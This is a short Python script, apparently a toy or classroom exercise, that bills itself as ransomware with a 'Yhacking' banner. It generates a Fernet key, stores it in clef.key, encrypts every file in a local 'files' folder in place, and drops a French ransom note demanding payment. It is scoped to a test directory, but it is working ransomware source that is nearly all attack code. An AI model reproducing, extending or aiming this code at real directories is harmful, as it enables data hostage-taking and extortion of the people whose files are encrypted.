from art import *
from termcolor import colored
print(colored(text2art("Yhacking").center(60),'red'))
print(colored("ransomware in your computer".center(50),'red'))
import os
def create_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def write_file(path,data):
    file = open(path,'w')
    file.write(data)
    return file
# def remplir_repertoire(dir):
#     with open(str(dir)+'/'+'file1.txt','w') as file :
#         file.write("Ce contenu est très important ....")
#         file.write("les informations de nos chers clients ...")
#     with open(str(dir)+'/'+'file2.txt','w') as file :
#         file.write("Ce contenu est très important ....")
#         file.write("les informations de nos chers clients ...")
pwd=create_dir('files')
# remplir_repertoire(pwd)
from cryptography.fernet import Fernet
items=os.listdir(pwd)
#print(items)
def generation_clef():
    clef=Fernet.generate_key()
    with open("clef.key",'wb') as key_file:
        key_file.write(clef)
def lire_clef():
    return open('clef.key','rb').read()
def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,'rb') as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,'wb') as File:
            File.write(encrypted_data)
path=[str(pwd) + '/' + item for item in items]
generation_clef()
clef=lire_clef()
chiffrement(path,clef)
with open(str(pwd) + '/'+ 'readme.txt','w') as file :
    file.write('Vous êtes amenés à payer la rançon .....')

